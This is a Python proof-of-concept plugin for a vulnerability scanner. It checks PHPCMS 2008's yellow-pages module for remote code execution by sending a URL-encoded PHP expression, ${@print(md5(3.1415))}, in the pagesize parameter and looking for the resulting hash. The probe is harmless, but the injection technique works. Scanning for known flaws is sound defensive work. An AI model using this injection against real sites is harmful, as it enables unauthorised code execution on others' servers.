# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0011' # 平台漏洞编号，留空
    name = 'PHPCMS 2008黄页模块代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-11-30'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = 'http://vul.jdsec.com/index.php/vul/JDSEC-POC-20141129-0564'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'PHPCMS 2008黄页模块'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4685817d-aa8d-4bdf-a45f-6f1ea2529614'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
                 
            payload = '/yp/product.php?pagesize=%24%7B%40%70%72%69%6E%74%28%6D%64%35%28%33%2E%31%34%31%35%29%29%7D'
            r = requests.get(self.target + payload)
            
            if r.text.find('63e1f04640e83605c1d177544a5a0488') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
